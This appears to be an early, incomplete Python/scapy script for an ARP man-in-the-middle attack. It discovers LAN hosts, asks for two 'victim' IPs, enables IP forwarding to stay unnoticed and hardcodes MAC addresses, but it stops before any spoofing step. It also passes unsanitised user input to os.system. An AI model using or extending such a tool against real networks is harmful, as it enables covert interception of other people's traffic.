from scapy.all import *
import sys
import os

print("\n\n    -------------------WELCOME TO SCAPY AS MITM---------------------")
print("     ----------------------Ritz & TheGX 2020----------------------\n\n")
print("         ____________              _______             ____________")
print("        |  victim 1  |----------->|  you  |---------->|  victim 2  |")
print("         ____________ <----------- _______ <---------- ____________\n")

def getMAC(IP, interface):
    conf.verb=0
    ans, unans = srp(Ether( dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface, inter=0.1) 
    print(ans)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def MITM():

    #we start by ping broadcasting our entire LAN to fill the arp table
    #so we can know the IP and MAC address of all hosts
    try:
        IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
        interface = input("Type the interface name: ")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme IP broadcast")
        sys.exit(1)

    ping_command = "ping {} -c 1".format(IpBroadcast)
    os.system(ping_command)

    os.system("sleep 1")
    print("\n\n\nAvailable hosts: \n")

    arp_command = "arp -i {} -a".format(interface)
    os.system(arp_command)
    # getting info victim

    try:
        victim_1ip= input("\nType victim 1 IP:")
        victim_2ip= input("\nType victim 2 IP:")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme victims'ip")
        sys.exit(1)

    #allowing ip forwarding since the attacker must work in such a way the victims don't know they are being attacked

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("Enabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=1")
    else: os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    mac1="0:1c:42:c2:1a:13"#getMAC(victim_1ip, interface)
    mac2="0:1c:42:7d:8d:40"#getMAC(victim_2ip, interface)
    
    print(mac1)
    print(mac2)

MITM()